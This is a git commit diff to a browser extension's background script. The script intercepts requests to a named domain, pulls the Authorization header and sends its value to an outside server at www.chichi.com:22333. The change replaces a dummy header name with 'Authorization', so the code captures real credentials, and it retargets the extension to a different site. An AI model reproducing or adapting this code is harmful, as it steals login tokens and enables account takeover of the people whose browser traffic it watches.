6bfd77c67d6b09957f5ac6a5055dc4b9bf08fa4c
kissrain <cjyang1123@gmail.com>
2023-09-03 22:55:51 +0800

    temp

--- extension/background.js
+++ extension/background.js
@@ -2,7 +2,7 @@ chrome.webRequest.onBeforeSendHeaders.addListener(function(details){
     // data contains request_body
 console.log(details);
 for (var i = 0; i < details.requestHeaders.length; ++i) {
-      if (details.requestHeaders[i].name === "Authorization2") {
+      if (details.requestHeaders[i].name === "Authorization") {
 fetch('http://www.chichi.com:22333/send?value='+details.requestHeaders[i].value)
 .then(function(response) {
 console.log(response);
@@ -10,6 +10,6 @@ console.log(response);
         break;
       }
     }
-},{'urls':["*://*.s-qec.com/*"]},['requestHeaders']);
+},{'urls':["*://*.t1111.net/*"]},['requestHeaders']);
 
 
